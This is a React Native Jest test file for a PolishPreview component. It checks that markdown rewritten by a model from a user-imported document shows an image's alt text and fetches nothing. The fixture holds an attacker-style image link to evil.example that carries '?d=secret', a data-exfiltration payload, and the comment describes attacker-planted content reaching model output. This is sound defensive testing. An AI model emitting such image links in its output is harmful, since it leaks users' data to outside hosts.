import React from 'react';
import { render } from '@testing-library/react-native';
import '../../../../i18n';

jest.mock('../../../../theme/ThemeContext', () => ({ useTheme: jest.fn() }));
import { useTheme } from '../../../../theme/ThemeContext';
import { lightColors } from '../../../../theme/colors';
import { PolishPreview } from '../PolishPreview';

/*
 * The polished text is written by a model from a document the user imported,
 * so it can carry an image an attacker planted (JEF-548). The preview renders
 * it through `Markdown`, which must show the alt text and fetch nothing.
 */
describe('PolishPreview with a model-written image', () => {
  beforeEach(() => {
    jest.mocked(useTheme).mockReturnValue({
      mode: 'light',
      resolvedScheme: 'light',
      colors: lightColors,
      setMode: jest.fn(),
    } as never);
  });

  it('renders the alt text and no Image', async () => {
    const { getByText, toJSON } = await render(
      <PolishPreview
        markdown="Polished letter. ![pixel](https://evil.example/p.png?d=secret)"
        onReplace={jest.fn()}
        onInsert={jest.fn()}
        onDiscard={jest.fn()}
      />,
    );

    expect(getByText('[pixel]', { exact: false })).toBeTruthy();
    const tree = JSON.stringify(toJSON());
    expect(tree).not.toContain('"type":"Image"');
    expect(tree).not.toContain('evil.example');
  });
});
